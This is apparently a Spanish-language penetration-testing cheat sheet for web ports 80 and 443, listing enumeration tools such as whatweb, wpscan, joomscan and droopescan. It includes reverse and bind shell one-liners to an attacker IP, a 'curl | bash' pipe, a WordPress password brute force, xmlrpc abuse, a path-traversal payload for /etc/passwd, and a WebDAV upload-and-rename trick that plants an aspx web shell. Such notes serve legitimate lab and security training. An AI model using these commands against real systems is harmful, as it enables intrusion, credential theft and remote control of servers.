# HTTP ❮❯

Tags: #Web #Puerto #Reconocimiento #Escaneo #CMS #Comandos 

80 - Este puerto es el que se usa para la navegación web de forma no segura HTTP. 

## Codigos de estado 
* 200 -> OK
- 301 -> Moved Permanently (Follow Redirect)
- 401 -> Unauthorized
- 403 -> Forbidden
- 404 -> Not Found

## URL-Encode
* & = %26

Si la versión del servidor HTTP es “**Apache httpd 2.4.46 o HTTP nginx 1.18.0**“, podemos determinar que el sistema está ejecutando una distribución de Ubuntu. El número de versión “**httpd 2.4.46 o nginx 1.18.0**” se refiere a la revisión específica del paquete de SSH en esa distribución de Ubuntu. A partir de esto, podemos identificar el **codename** de la distribución de Ubuntu, que en este caso sería “**Focal**” para Ubuntu 20.04.
Todas estas búsquedas las aplicamos sobre el siguiente dominio:
-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

### Rutas tipicas
**/var/www/html** Ruta tipica de Apache o Nginx
**/opt/blog/server.js** Ruta por default de Node.js

❯ **Ctrl + u** Para ver el codigo fuente de la pagina web
❯ **Ctrl + r** Recargar la pagina web
❯ **Ctrl + Shift + c** Para inspeccionar el codigo 

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

```bash
❯ whatweb ❮http://❮IP❯ -v

	# v = Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas
```

```bash
❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

```bash
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```

```bash
❯ wget http://❮IP❯/❮File❯              # Para poder cargar o descargar un archivo especifico desde una IP
```

## ReverShell y BindShell
Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
1) Cuando tenemos Netcat 
2) Cuando no tenemos Netcat
```bash 
❯ nc -e /bin/bash IP-Atacante 443

❯ bash -i >& /dev/tcp/IP-Atacante/443 0>&1
```

```bash
❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una **BindShell** :
```


# HTTPS ❮❯
443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```

```bash
❯ sslscan ❮IP❯:8443                      # Te da informacion del ssl de la maquina y si detecta alguna vulnerabilidad te la representa, podemos colocar el puerto si no es el comun 443
```


### WordPress Enumeracion 

Formas de **Enumerar**
* **Usuarios** que aparezcan en la pagina Web, podemos validarlos en el panel de autenticacion **Admin**

**/wp-login.php**    Es la ruta del panel de autenticacion 
**/wp-admin.php** Es la ruta del panel de autenticacion de admin
**/wp-json/wp/v2/users/** Reporta usuarios validos en la pagina de WordPress en formato Json
**/wp-content/plugins** Para ver si podemos hacer directory listing y ver los plugins existentes

```bash
❯ wpscan --url ❮http://IP/❯                               # Detecta vulnerabilidades en un wordPress
```

```bash
❯ wpscan --url <http://URL/> -e u,vp                      # Enumeracion 

	# u = Enumerar usuarios
	# vp = Enumerar plugins vulnerables
```

```bash
❯ wpscan --url <http://URL/> -e vp --api-token="DFFGB15GD68DG618GD81GRD"     # Enumeracion 

	# vp = Enumerar plugins vulnerables
	# api-token = Nos representa de mejor manera las vulnerabilidades porque ya tiene el accceso
```

```bash
❯ wpscan --url <http://IP/> -U <USER> -P /usr/share/wordlists/rockyou.txt # Fuerza bruta

	# P = Ruta del diccionario 
	# U = Usuario valido
```

```bash
❯ curl -s -X GET "http://IP/" | grep -oP 'plugins/\k[^/]+' | sort -u # Filtramos por plugins en la paggina web y ver si alguno es vulnerable, los podriamos buscar en Searchsploit

	# sort u = Quitar los resultados repetidos y dejar los 'unicos'
	# s = Modo silencioso 
```

**/xmlrpc.php** Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones por **POST** y que este estructurada en **XML**
* Debemos de listar los metodos y lo haremos con el codigo del archivo y ver si existe el siguiente **getUsersBlogs** y despues aplicar fuerza bruta
* [Xmlrpc-Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
```bash
❯ curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml

	# d@ = Indicamos el archivo que usaremos y es que esta abajo 
```

```bash
❯ nano file.xml

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>
```


### Joomla Enumeracion 

Esta herramienta ademas de enumerar un servidor Joomla, nos crea un reporte de las vulnerabilidades que encontro.
**/administrator** Es la ruta del panel de autenticacion de admin

```bash 
❯ perl joomscan.pl -u http://IP/
```

### Drupal Enumeracion 

Esta herramienta ademas de enumerar un servidor Drupal

```bash 
❯  droopescan scan drupal --url https://IP/
```

### Magento Enumeracion 

Esta herramienta ademas de enumerar un servidor Magento
**/administration/admin/index** Es la ruta del panel de autenticacion de admin

```bash 
❯  php magescan.phar scan:all https://IP/
```







- **cat wp-config.php | less** Este archivo suele disponer de credenciales de acceso a la base de datos, file que se encuentra dentro de la maquina victimas y lo miramos en formato de pagina
Tmabien podemos usar **wpseku github security scanner**  o **wordpressscan github**, pero la 'mejor' es wpseku 
- Dentro de un WP podemos editar ese template y colocar un comando. Appearance ->Editor -> 404 Template

- /usr/share/davtest/backdoors/**aspx_cmd.aspx**   Ejecutable que al momento de ejecutarse en una pagina Web, nos dara una WebShell

- Comando -> **curl http://< IP> -v** Haremos que nos ejecute un curl para poder ver la cabeceras de la pagina solicitada y su data


- Comando -> 
- Comando -> **curl -s -X GET http://< IP>/?p=404** Apuntas a una ruta 404 y haces la peticion
- Comando -> **curl -s -X PUT http://< IP>/file.txt -d @file.txt** Para subir un archivo a una pagina web con un comando a la url que lo indicaremos con el @, este archivo debe tener una extencion especifica y permitida por el webdav. El example.txt en la url es el que debe de tener una extencion permitida.
En este caso para ver mejor el contenido de arriba por Burpsuite, aplicamos el siguiente comando
- Comando -> **curl -s -X POST http://< IP>/fielRead.php -d 'file=./.list/....//....//....//....//etc/passwd'** Miramos la resuesta por POST de la pagina web, y a nivel de (d=data) le pasamos eso 
	- fileRead.php -> lo buscamos en el BurpSuite en la cabecera de POST
- Comando -> **curl -s -X MOVE -H “Destination:http://< URL>/cmd.aspx” http://< URL>/cmd.txt** Moveremos el archivo que subimos con extension .txt ya que no puede ser interpretado y le aplicaremos un renombramiento colocandole su extrension .aspx y lo haremos con la cabecera destination. Esto no dara una terminal en la web. (s=silence)
